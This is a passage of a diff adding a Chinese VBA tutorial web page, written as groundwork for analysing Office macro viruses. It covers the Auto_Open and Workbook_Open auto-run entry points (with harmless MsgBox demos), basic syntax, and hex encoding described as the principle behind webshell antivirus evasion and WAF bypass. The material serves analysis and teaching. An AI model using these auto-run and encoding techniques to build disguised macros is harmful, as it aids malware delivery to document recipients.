+        <li class="md-nav__item">
+  <a href="#2vba" title="2、VBA代码阅读扫盲" class="md-nav__link">
+    2、VBA代码阅读扫盲
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" title="(1) 环境介绍" class="md-nav__link">
+    (1) 环境介绍
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="(2) 宏脚本运行入口点" class="md-nav__link">
+    (2) 宏脚本运行入口点
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" title="方法1：" class="md-nav__link">
+    方法1：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1_2" title="方法1：测试代码" class="md-nav__link">
+    方法1：测试代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" title="方法2：" class="md-nav__link">
+    方法2：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" title="方法2：测试代码" class="md-nav__link">
+    方法2：测试代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="小结：" class="md-nav__link">
+    小结：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" title="(3) 代码调试" class="md-nav__link">
+    (3) 代码调试
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" title="(4) 变量" class="md-nav__link">
+    (4) 变量
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" title="(5) 运算符" class="md-nav__link">
+    (5) 运算符
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" title="(6) 逻辑运算符" class="md-nav__link">
+    (6) 逻辑运算符
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-if" title="(7) IF分支选择结构" class="md-nav__link">
+    (7) IF分支选择结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-selectcase" title="(8) Select...Case分支选择结构" class="md-nav__link">
+    (8) Select...Case分支选择结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#9" title="(9) 循环结构" class="md-nav__link">
+    (9) 循环结构
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#doloop" title="Do...Loop循环" class="md-nav__link">
+    Do...Loop循环
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fornext" title="For...Next循环" class="md-nav__link">
+    For...Next循环
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for_each_in" title="For_Each_In循环" class="md-nav__link">
+    For_Each_In循环
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#10" title="(10) 数组表达" class="md-nav__link">
+    (10) 数组表达
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="数组声明" class="md-nav__link">
+    数组声明
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uboundlbound" title="Ubound和Lbound函数获取数组的上下限" class="md-nav__link">
+    Ubound和Lbound函数获取数组的上下限
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#11" title="(11) 字符串操作" class="md-nav__link">
+    (11) 字符串操作
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hexhex2dec" title="Hex与Hex2Dec函数" class="md-nav__link">
+    Hex与Hex2Dec函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="文本函数" class="md-nav__link">
+    文本函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#replace" title="Replace函数" class="md-nav__link">
+    Replace函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#split" title="Split函数" class="md-nav__link">
+    Split函数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" title="(12) 文件读写" class="md-nav__link">
+    (12) 文件读写
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="文件遍历" class="md-nav__link">
+    文件遍历
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="文件属性" class="md-nav__link">
+    文件属性
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3_1" title="3、常用对象" class="md-nav__link">
+    3、常用对象
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-adodbstream" title="(1) ADODB.Stream 对象" class="md-nav__link">
+    (1) ADODB.Stream 对象
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-msxml2xmlhttp" title="(2) Msxml2.XMLHTTP 对象" class="md-nav__link">
+    (2) Msxml2.XMLHTTP 对象
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_2" title="(3) 执行命令对象与函数" class="md-nav__link">
+    (3) 执行命令对象与函数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4_1" title="4、案例：宏病毒分析" class="md-nav__link">
+    4、案例：宏病毒分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" title="(1) 调试环境" class="md-nav__link">
+    (1) 调试环境
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_3" title="(2) 调试过程" class="md-nav__link">
+    (2) 调试过程
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_3" title="(3) 工具提取宏" class="md-nav__link">
+    (3) 工具提取宏
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>VBA</h1>
+                
+                <h2 id="1office-macor">1、Office Macor</h2>
+<p>MS office宏的编程语言是Visual Basic For Applications(VBA)。</p>
+<p>微软在1994年发行的Excel5.0版本中，即具备了VBA的宏功能。开发目的是为了在其桌面应用程序中执行通用的自动化任务，用于扩展Windows的应用程序功能。在分析带有宏病毒的样本前，我们需要对VBA有所了解。才能更顺畅地了解病毒发展中的手段和变化。</p>
+<h2 id="2vba">2、VBA代码阅读扫盲</h2>
+<h3 id="1">(1) 环境介绍</h3>
+<ul>
+<li>打开Excel的开发者工具</li>
+</ul>
+<p>当用户希望使用宏功能时，可在“开发工具”选项卡下选择相应命令。在默认情况下，功能区中不显示“开发工具”选项卡，需要用户进行自行设置。</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180324173822462-707323325.png" /> </p>
+<p>图1</p>
+<ul>
+<li>保存带宏测试文件</li>
+</ul>
+<p>微软为了使用MSOffice用户免遭病毒和危险宏代码的危害，规定不能将宏代码保存在使用标准文件扩展名的标准 Office 文档中。</p>
+<p>必须将代码保存在特殊扩展名的文件中。例如不能将宏保存在扩展名为 .docx 的标准 Word 文档中；而是必须使用扩展名为 .docm 且启用了宏的特殊 Word 文档。而Excel则是另存为.xlsm格式。</p>
+<h3 id="2">(2) 宏脚本运行入口点</h3>
+<p>让Excel工作簿中宏自动运行的两种方法。</p>
+<h4 id="1_1">方法1：</h4>
+<p>1、启动Excel并打开包含宏的工作表，在“开发工具”选项卡的“代码”组中单击“宏”按钮打开“宏”对话框。</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180324174731412-1767473230.png" />
+   图2</p>
+<p>创建宏名为"Auto_Open"可以实现自动打开的功能。</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180324175431080-1549938705.png" />
+   图3</p>
+<p>点击“Visual Basic”按钮就可以编辑对应的宏代码。</p>
+<p>会弹出"Hello World”框的示例代码：</p>
+<h4 id="1_2">方法1：测试代码</h4>
+<p>01-Auto_Open()_启用宏.xlsm</p>
+<pre><code>//自启动函数1
+Sub Auto_Open()
+
+MsgBox (&quot;Hello World&quot;)
+
+End Sub
+</code></pre>
+
+<h4 id="2_1">方法2：</h4>
+<p>点击Visual Basic按钮，点击在工程窗口里的ThisWorkbook。选择workbook（对象）</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180324182127735-190622884.png" /></p>
+<p>图4 </p>
+<p>保存该文档为".xlsm"，当再次打开该文档时，宏将自动运行。</p>
+<p>在分析病毒的时候，发现Workbook_Open()，Workbook_Activate()都会触发宏的运行。</p>
+<h4 id="2_2">方法2：测试代码</h4>
+<p>02-Workbook_Open()_启用宏.xlsm</p>
+<pre><code>Private Sub Workbook_Open()
+
+MsgBox (&quot;Hello World ! z&quot;)
+
+End Sub
+</code></pre>
+
+<h4 id="_1">小结：</h4>
+<p>Auto_Open过程是一个特殊的自定义Sub过程，其包含的代码可以在工作簿打开时自动执行，宏过程写入其中当然也将被自动调用执行。Worksheet对象的Activate事件是在工作表被激活时触发，在该事件代码中调用宏过程将使工作表被激活时宏被启用。</p>
+<h3 id="3">(3) 代码调试</h3>
+<p>通过录制宏的操作，得到如何对表格赋值的方法。</p>
+<p>A1是所选择的表格与列,ActiveCell.FormulaR1C1是进行赋值。</p>
+<pre><code>Range(&quot;A1&quot;).Select '表格选择
+ActiveCell.FormulaR1C1 = &quot;1&quot; '赋值
+</code></pre>
+
+<p>在开启之前首先要开启编译器的窗口。</p>
+<ul>
+<li>
+<p>立即窗口：执行单行的语句或显示Debug.Pring所打印的表达式的值。</p>
+</li>
+<li>
+<p>本地窗口：显示当前运行的过程中所包含的变量的值。</p>
+</li>
+<li>
+<p>监视窗口：显示被监视的指定表达式的值。</p>
+</li>
+</ul>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180324202244376-28675285.png" /></p>
+<p>图5</p>
+<h3 id="4">(4) 变量</h3>
+<p>声明 变量时，通常使用 Dim 语句。可以在过程中添加声明语句以创建 过程级别变量，也可以将其放置在 模块顶部的声明部分，以创建 模块级别变量。</p>
+<p>下面的示例创建变量并指定 字符串数据类型。</p>
+<p>strName 是变量的名称，type是变量的类型</p>
+<pre><code>Dim strName As 【type】
+</code></pre>
+
+<p>数据类型分类及表示形式：</p>
+<p>(1) 数值型</p>
+<p>Byte 、Integer 、Long 、Single 、Double</p>
+<p>(2) 字符型</p>
+<p>String （可变长度字符串）、String *** length （固定长度字符串）</p>
+<p>(3) 日期型</p>
+<p>Date </p>
+<p>(4) 逻辑型</p>
+<p>Boolean </p>
+<p>(5) 对象型</p>
+<p>Object 或 Variant 。如果未指定数据类型，则默认分配 Variant 数据类型。还可以使用 Type 语句创建 用户定义的类型。</p>
+<p>声明的表示形式如下：</p>
+<pre><code>Dim sPara As sType
+Dim para1, para2, para3
+Dim para4 As workbook, para5 As String
+</code></pre>
+
+<p>用Dim语句创建变量(声明变量) 示例：</p>
+<pre><code>Sub 变量定义()
+'
+' 变量定义 宏
+'
+    '变量定义
+    Dim strA As String
+
+    '变量赋值
+
+    strA = &quot;Hello World&quot;
+
+    Debug.Print strA
+
+End Sub
+</code></pre>
+
+<p>VBA常用的数据类型定义里参数type是可省略的。对于VBA熟悉的开发者会省略AS采用变量标识符来声明变量类型，遇到这样的代码很容易使分析人员产生疑惑。</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180324204841014-1159375095.png" /></p>
+<p>图6</p>
+<p>类型标识符示例代码：</p>
+<pre><code>Sub 类型标识符()
+
+    '类型标识符
+
+    Dim strC$
+
+    strC = &quot;WS发育法&quot;
+
+    Debug.Print strC
+
+End Sub
+
+</code></pre>
+
+<p><strong>全局变量</strong></p>
+<p>在VBA中，通过Public关键字语句定义全局变量，供多个程序调用。</p>
+<pre><code>
+'声明全局变量
+Public strA As String
+
+Sub 过程1()
+    ' 变量声明
+    Dim strB As String
+    ' 变量赋值
+    strA = &quot;Hello&quot;
+    strB = &quot;World!&quot;
+End Sub
+
+Sub 过程2()
+    ' 输出变量
+    Debug.Print &quot;StrA为&quot; &amp; strA
+    Debug.Print &quot;StrB为&quot; &amp; strB
+End Sub
+
+Sub 过程()
+    ' 调用函数
+    Call 过程1
+    Call 过程2
+End Sub
+
+
+</code></pre>
+
+<p>输出结果：</p>
+<pre><code>StrA为Hello
+StrB为
+</code></pre>
+
+<p><strong>模块级变量</strong></p>
+<p>还有一种特殊的模块级变量，定义在所有的过程之外，也以Dim进行变量声明。这类变量的作用域是其所在的模块，在这个模块内的任何过程均可调用该变量，但是其他模块不可以调用它。</p>
+<p>通过调用两个模块的代码进行验证过程如下：</p>
+<p>模块：模块级变量03_01代码：</p>
+<pre><code>'声明局部变量
+Dim strC As String
+
+Sub 过程3()
+    '变量赋值
+    strC = &quot;Hello&quot;
+End Sub
+
+
+Sub 过程4()
+    '变量赋值
+    Debug.Print &quot;StrC为&quot; &amp; strC
+End Sub
+
+</code></pre>
+
+<p>插入-&gt;模块，再输入以下代码：</p>
+<p>查看模块间函数调用，变量的变化。</p>
+<p>模块：模块级变量03_02</p>
+<pre><code>Sub 过程5()
+    '变量赋值
+    Debug.Print &quot;StrC为&quot; &amp; strC
+End Sub
+
+Sub 过程6()
+    Call 过程3
+    Call 过程4
+    Call 过程5
+End Sub
+</code></pre>
+
+<p>输出结果：</p>
+<pre><code>StrC为Hello
+StrC为
+</code></pre>
+
+<p>作用域的理解至关重要，简单区分作用域的方法只需要判定变量声明是在哪里，如果在过程内，则作用域为该过程，如果在过程外，以Public声明的变量为全局变量，以Dim或Private声明的变量为模块级变量。</p>
+<h3 id="5">(5) 运算符</h3>
+<p>VBA除了常规的四则运算外，还能够进行文本连接，比较运算。</p>
+<p>其中为了生成的数据更明朗，就用了回车换行。</p>
+<p>'chr(10) 可以生成换行符
+ 'chr(13) 可以生成回车符</p>
+<pre><code>Sub VBA常用运算()
+
+    '文本连接 F5运行
+    Debug.Print &quot;&quot;&quot;Excel&quot;&quot; &amp; &quot;&quot;WS&quot;&quot; = &quot;; &quot;Excel&quot; &amp; &quot;Virus&quot; &amp; Chr(13) &amp; Chr(10)
+
+    '算数四则运算
+    Debug.Print &quot; 1 + 2 * 3 - 4 / 2 = &quot;; 1 + 2 * 3 - 4 / 2 &amp; Chr(13) &amp; Chr(10)
+
+    '整除
+    Debug.Print &quot;13 \ 5 = &quot;; 13 \ 5 &amp; Chr(13) &amp; Chr(10)
+
+    '计算余数
+    Debug.Print &quot;13 Mod 5 = &quot;; 13 Mod 5 &amp; Chr(13) &amp; Chr(10)
+
+    '比较运算
+    Debug.Print &quot;13 &gt; 5 = &quot;; 13 &gt; 5 &amp; Chr(13) &amp; Chr(10)
+    Debug.Print &quot;13 &lt; 5 = &quot;; 13 &lt; 5 &amp; Chr(13) &amp; Chr(10)
+    Debug.Print &quot;13 &lt;&gt; 5 = &quot;; 13 &lt;&gt; 5 &amp; Chr(13) &amp; Chr(10)
+
+End Sub
+
+</code></pre>
+
+<p><strong>文本连接</strong></p>
+<p>在VBA中，允许将多个文本通过文本连接符(&amp;)进行连接并组合成新的本文，其基本语法为</p>
+<blockquote>
+<p>EXP1&amp;EXP2&amp;EXP3</p>
+</blockquote>
+<p>加号(+)同样可以用于文本的连接，其运算语法与文本连接符(&amp;)一致，而加号同样可以用作算数运算。</p>
+<p><strong>算数四则运算</strong></p>
+<p>算数四则运算符包括加(+)、减(-)、乘(*)、除(/)。</p>
+<h3 id="6">(6) 逻辑运算符</h3>
+<p>在IF判断中遇到多条件的判断，判断是否同时满足两个条件的情形，会用到逻辑运算符。常见的为And、Or、Not</p>
+<blockquote>
+<p>表达式 逻辑运算符 表达式</p>
+</blockquote>
+<h3 id="7-if">(7) IF分支选择结构</h3>
+<p>典型的分支结构，最常用的就是IF...Then...Else结构，语法为：</p>
+<pre><code>If 表达式
+
+Then
+   声明
+Else
+   声明
+</code></pre>
+
+<p>或者</p>
+<pre><code>If 表达式 Then
+ 声明
+ElseIf 表达式 Then
+  声明
+Else
+   声明
+End If
+</code></pre>
+
+<p>表达式是逻辑判断表达式，可以是比较，也可以是由逻辑运算符连接的表达式。</p>
+<p>单一型IF分支结构代码如下：</p>
+<pre><code>
+Sub IF分支1()
+     '变量声明
+    Dim NumA As Long  '密码值
+    Dim NumB As Long  '数值2
+
+    NumA = 5
+    NumB = 6
+
+    If NumA &gt; NumB Then
+        Debug.Print &quot;NumA &quot; &amp; NumA
+    End If
+
+End Sub
+
+</code></pre>
+
+<p>复杂型If分支结构如下：</p>
+<pre><code>Sub IF分支2()
+    '变量声明
+    Dim passwd As Long  '密码值
+    Dim input_Code As Long  '数值2
+
+    passwd = 123456
+
+
+    '两数相加
+    'Range(&quot;A2&quot;).Select
+    'ActiveCell.FormulaR1C1 = &quot;1&quot;
+    input_Code = Range(&quot;A2&quot;)
+    If input_Code &lt; passwd Then
+         Range(&quot;A6&quot;).Select                   '选择表格A6
+         ActiveCell.FormulaR1C1 = &quot;结果小了&quot;  '赋值
+    ElseIf input_Code &gt; passwd Then
+        Range(&quot;A6&quot;).Select
+         ActiveCell.FormulaR1C1 = &quot;结果大了&quot;
+    ElseIf input_Code = passwd Then
+        Range(&quot;A6&quot;).Select
+         ActiveCell.FormulaR1C1 = &quot;结果正确&quot;
+    End If
+    ' 结果输出
+    Debug.Print &quot;正确数字为 &quot; &amp; passwd
+End Sub
+</code></pre>
+
+<p>如果满足条件时所需要执行的语句。</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326093326533-1539961339.png" /></p>
+<p>图7</p>
+<h3 id="8-selectcase">(8) Select...Case分支选择结构</h3>
+<p>Select...Case是VBA中分支结构，当对同一个表达式的值进行多次不同的判断，并根据判断需要进行不同的程序操作时候用到。
+语法结构：</p>
+<pre><code>Select Case 表达式
+Case 表达式
+
+Case 表达式
+
+End Select
+
+</code></pre>
+
+<p>不同Case中的表达是表达式的测试值。</p>
+<p>示例代码:</p>
+<pre><code>Sub Select_Case()
+    '变量声明
+    Dim NumA As Integer
+    NumA = 100
+
+    Select Case NumA
+        Case 90 To 100
+            Debug.Print &quot;优秀&quot;
+        Case 70 To 90
+            Debug.Print &quot;良&quot;
+        Case 60 To 70
+            Debug.Print &quot;及格&quot;
+        Case Else
+            Debug.Print &quot;不及格&quot;
+    End Select
+
+End Sub
+
+</code></pre>
+
+<p>输出结果：</p>
+<pre><code>优秀
+</code></pre>
+
+<p>在许多情况下，Select和If分支结构可以互相转换，但两者也有比较大的区别，Select分支结构只能对同一个表达式的值进行分支判断，而If却不受该限制。</p>
+<h3 id="9">(9) 循环结构</h3>
+<h4 id="doloop">Do...Loop循环</h4>
+<pre><code>Do While 表达式
+   声明
+Loop
+</code></pre>
+
+<p>使用Do..Loop循环判断质数示例：</p>
+<pre><code>Sub DoWhile循环()
+    '变量声明
+    Dim Num As Long
+    Dim i As Long
+    '变量赋值
+    Num = 13
+    i = 2
+    '计算及结果输出
+    Do While Num Mod i &lt;&gt; 0   '被2整除不是质数
+        i = i + 1
+        If i &gt;= 10 Then        ' 如果大于10，退出循环演示
+            Exit Do '终止循环'
+        End If
+    Loop
+    If i = Num Then
+        Debug.Print Num; &quot;是质数&quot;
+    Else
+        Debug.Print Num; &quot;不是质数&quot;
+    End If
+
+
+End Sub
+
+</code></pre>
+
+<p>输出结果：</p>
+<pre><code> 13 不是质数
+</code></pre>
+
+<h4 id="fornext">For...Next循环</h4>
+<p>对于已知起始值和终止值的循环语句，往往用For...Next结构实现，其语法为：</p>
+<pre><code>For 计数器 = 起始值 To 终止值 Step 递增值
+   处理
+Mext
+</code></pre>
+
+<p>使用For...Next循环判断质数示例：</p>
+<pre><code>Sub For_Next循环()
+    '变量声明
+    Dim Num As Long
+    Dim i As Long
+    '变量赋值
+    Num = 13
+   '计算
+   For i = 2 To Num - 1 Step 1
+      If Num Mod i = 0 Then
+        If i &gt;= 10 Then        ' 如果大于10，退出循环
+              Exit For  '退出循环的方式
+        End If
+      End If
+   Next i
+   '结果输出
+   If i = Num Then
+        Debug.Print Num; &quot;是质数&quot;
+    Else
+        Debug.Print Num; &quot;不是质数&quot;
+    End If
+
+End Sub
+
+</code></pre>
+
+<p>输出结果：</p>
+<pre><code> 13 是质数
+</code></pre>
+
+<p>在For...Next循环中，需要一个计数器，并为其设置初始值，以及终止值和步长。进入循环后，计数器等于初始值，当执行完Next语句后，计数器将会加上步长(即计数器=计数器+步长)，然后再次进入For语句。VBA将判断计数器是否仍然出于初始值和终止值之间。如果仍在它们之间则继续循环，直到计数器的值超出初始值和终止值所包含的范围。</p>
+<p>与退出Do..Loop循环类似，可以利用Exit For循环语句退出当前的For循环。</p>
+<h4 id="for_each_in">For_Each_In循环</h4>
+<p>VBA也有类似Python中遍历数值的循环方法。</p>
+<p>For Each...Next循环可以用来访问某个集合中所有的元素，其语法格式为</p>
+<pre><code>For Each 元素 In 组
+   处理
+   [Exit For]
+Next 元素
+</code></pre>
+
+<p>元素为变量，组表示某个集合。组可以表示的集合可以是单元格区域、工作表集合、工作簿集合、数组集合等。</p>
+<pre><code>Sub For_each_in循环()
+
+Sheets(&quot;Sheet1&quot;).Select
+
+Dim r As Range
+For Each r In Range(&quot;A1:A10&quot;)
+   Debug.Print r.Value;
+
+   If r.Value = 1 Then  '如果值为1就修改为 666666
+   r.Value = 666666
+   End If
+Next
+
+End Sub
+
+</code></pre>
+
+<p>输出结果：</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326101929985-283683268.png" /></p>
+<p>图8</p>
+<h3 id="10">(10) 数组表达</h3>
+<p>数组表示一组数据的集合，在VBA中，允许将多个类型相同或者不相同的数据组合成一个集合，然后用其下标访问其每个元素。</p>
+<p>一维数组表示方式如下：</p>
+<pre><code>Array(index)
+</code></pre>
+
+<p>该表达式表示数组中的一个元素。其中Array表示一个数组变量，Index为其下标。数组的下表可以为正数、负数或者0，但是必须为整数。</p>
+<p>数组可以具有多个下标，该数组即为多维数组。多维数组的元素使用以下表达式表示：</p>
+<pre><code>Array(index1,index2[[,index3],...,index])
+</code></pre>
+
+<p>其中，index1至indexs表示不同维度的数组下标，在VBA中，数组的维度最多不超过60。</p>
+<h4 id="_2">数组声明</h4>
+<p>按数组元素个数是否固定可以分为固定大小的数组和动态数组。固定大小的数组的维度以及各个维度的大小是固定的。</p>
+<pre><code>Dim ArrayName(LB1 To UB1)
+</code></pre>
+
+<p>ArrayName 表示数组变量的名称，LBn和UBn分别表示不同维度上的数组的下限和上限。不同维度上的LB及UB可以各不相同。</p>
+<h4 id="uboundlbound">Ubound和Lbound函数获取数组的上下限</h4>
+<p>Ubound和Lbound函数分别获取已定义大小的数组在不同维度的上限和下限。</p>
+<p>一维数组示例代码：</p>
+<pre><code>Sub 数组示例00()
+
+    Sheets(&quot;Sheet2&quot;).Select
+    Dim Arr(3)
+    Arr(1) = 1
+    Arr(2) = 2
+    Arr(3) = 3
+
+    For Index = 0 To UBound(Arr)
+       Debug.Print Arr(Index)
+
+    Next
+
+End Sub
+</code></pre>
+
+<p>输出结果：</p>
+<pre><code>1
+2
+3
+</code></pre>
+
+<p>多维数组示例代码：</p>
+<pre><code>Sub 数组示例01()
+
+    Sheets(&quot;Sheet2&quot;).Select
+    Dim Arr()               '声明数组
+    Arr = Range(&quot;A1&quot;).CurrentRegion.Value             '返回活动单元格所在的周围由空行和空列组成的单元格区域
+
+    For RowN = 2 To UBound(Arr)                       '返回指定数组维数的最大下标。
+        Debug.Print &quot;当前单元格数据：&quot; &amp; Arr(RowN, 1)
+    Next
+
+End Sub
+</code></pre>
+
+<p>输出结果
+<img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326095454373-1762377328.png" /></p>
+<p>图9</p>
+<p>多维数组统计项目示例代码：</p>
+<pre><code>Sub 数组进行统计()
+    '变量声明
+     Dim Arr()               '声明数组
+     Dim RowN As Long        '数组中的行号
+     Dim TotalQTY As Long    '合计数量
+     Dim TotalAmount As Long '合计金额
+     Dim sType As String     '姓名
+
+     '获取报告数量
+     sType = Range(&quot;F2&quot;).Value
+     '合计数清0
+     TotalQTY = 0
+     TotalAmount = 0
+     '将数据读入数组中
+     Arr = Range(&quot;A1&quot;).CurrentRegion.Value             '返回活动单元格所在的周围由空行和空列组成的单元格区域
+     '遍历数组中的每条记录，第1个维度
+     For RowN = 2 To UBound(Arr)                       '返回指定数组维数的最大下标。
+        '若规格型号相符
+        If Arr(RowN, 1) = sType Then
+           '累加数量和金额
+           TotalQTY = TotalQTY + Arr(RowN, 2)          '报告数量
+           TotalAmount = TotalAmount + Arr(RowN, 3)    '项目金额
+        End If
+    Next
+    '结果输出
+    Range(&quot;G2&quot;).Value = TotalQTY
+    Range(&quot;H2&quot;).Value = TotalAmount
+
+End Sub
+
+</code></pre>
+
+<p>输出结果</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326100659187-451398454.png" /></p>
+<p>图10</p>
+<h3 id="11">(11) 字符串操作</h3>
+<p>常用函数说明</p>
+<h4 id="hexhex2dec">Hex与Hex2Dec函数</h4>
+<p>利用Hex函数可以将十进制数转换为十六进制数，Hex2Dec函数可以将十六进制数转换为十进制数。</p>
+<pre><code>Hex(number) 其中参数number为十进制数
+HEX2DEC(参数) 十六进制转换为十进制
+
+</code></pre>
+
+<p>通过这样的内置函数可以把某些字符转换为进制编码，然后在内部执行时再转换回来。</p>
+<p>示例代码：</p>
+<pre><code>Sub 转换进制_1()
+   Sheets(&quot;Sheet3&quot;).Select                           '指定表
+    ' 变量声明
+    Dim RowN As Long
+    '开始循环遍历
+    For RowN = 2 To Cells(Rows.Count, &quot;A&quot;).End(xlUp).Row   '选定包含单元格A区域中A列顶端的单元格，此部分从第2列开始。
+
+        '使用VBA函数转换为十六进制数
+        Cells(RowN, &quot;B&quot;).Value = &quot;'&quot; &amp; CStr(Hex(Cells(RowN, &quot;A&quot;).Value)) '选定包含单元格B区域中B列顶端的单元格。
+
+        '使用工作表函数转换为十进制
+        Cells(RowN, &quot;C&quot;).Value = _
+            WorksheetFunction.Hex2Dec(Cells(RowN, &quot;B&quot;).Value)                '选定包含单元格B区域中B列顶端的单元格。
+    Next RowN
+
+
+End Sub
+</code></pre>
+
+<p>输出结果：</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326113920524-687694441.png" /></p>
+<p>图11</p>
+<p>在早些时候，很多利用ACCESS或是SQL Server数据库的SQL注入手段通过内置的函数将原有的词义分割绕过WAF，与在Offcice系列中的宏病毒手法异曲同工。</p>
+<p>示例代码：</p>
+<p>字符转十六进制，十六进制转字符</p>
+<pre><code>
+Sub 转换进制2_原型()
+    Sheets(&quot;Sheet4&quot;).Select                           '指定表
+
+    ' 变量声明
+    Dim RowA$, RowB$, str$
+    Dim strA$, strB$
+    '开始循环遍历
+    str = &quot;MZ&quot;
+    RowA = Hex(AscW(Left(str, 1)))  '选取最左边第一个字符
+    RowB = Hex(AscW(Right(str, 1))) '选取最右边第一个字符
+
+    Debug.Print RowA + RowB
+
+
+    '开始循环遍历
+    strA = Chr(WorksheetFunction.Hex2Dec(RowA)) '十六进制转换为十进制，十进制转字符
+    strB = Chr(WorksheetFunction.Hex2Dec(RowB)) '十六进制转换为十进制，十进制转字符
+
+    Debug.Print &quot;I am PE First Two char: &quot;; strA + strB
+
+    '有条件性进行演示一句话木马免杀原理。
+
+End Sub
+</code></pre>
+
+<p>输出成果：</p>
+<pre><code>4D5A
+I am PE First Two char: MZ
+</code></pre>
+
+<h4 id="_3">文本函数</h4>
+<p>VBA处理文本的函数和语句，其中包括Instr函数、Replace函数、Left函数、Right函数、MID函数。</p>
+<ul>
+<li>Instr函数</li>
+</ul>
+<pre><code>InStr(开始位置,字符串1，字符串2,[模式选择:二进制比较,文本比较])
+</code></pre>
+
+<p>参数开始位置，表示查找的起始未知，该参数可以省略
+参数字符串1，表示被搜索的文本(字符串)，即在哪里查找
+参数字符串2，表示需要查找的
+可选参数为字符串的比较方式，当参数省略时候，就用Option Conpare语句指定的比较方式。</p>
+<p>筛选包含字符的记录示例代码：</p>
+<pre><code>Sub 筛选包含某字符的记录()
+    '变量声明
+    Dim RowN As Long
+    Sheets(&quot;Sheet2&quot;).Select '选择第二张表
+    ' 显示所有记录
+    Cells.Rows.Hidden = False
+    '循环遍历每一行
+    For RowN = 2 To Cells(Rows.Count, &quot;A&quot;).End(xlUp).Row
+        '判断是否含有“上海”
+        If InStr(1, Cells(RowN, &quot;B&quot;).Value, &quot;上海&quot;) = 0 Then
+            '若不含有，则隐藏
+            Rows(RowN).Hidden = True
+        End If
+    Next
+End Sub
+
+</code></pre>
+
+<p>输出成果：</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326114325165-150063847.png" /></p>
+<p>图12</p>
+<p>Instr函数在字符串中查找字符的顺序是从左到右，还有个与它类似的函数InstrRev函数方向顺序是以右到左。</p>
+<h4 id="replace">Replace函数</h4>
+<p>替换文本中的指定文本</p>
+<p>示例代码：</p>
+<pre><code>Sub Replace函数()
+
+Dim txt, strA
+
